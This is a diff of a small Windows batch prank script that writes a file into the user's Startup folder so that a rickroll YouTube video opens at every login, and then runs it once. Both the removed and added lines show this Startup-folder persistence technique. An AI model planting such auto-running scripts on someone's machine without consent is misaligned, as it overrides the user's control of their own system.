@@ -1,4 +1,4 @@
 @echo off
-copy rickroll.bat %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\
-Start %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\rickroll.bat
+echo explorer https://www.youtube.com/watch?v=dQw4w9WgXcQ > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\rickroll.bat"
+"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\rickroll.bat"
 exit
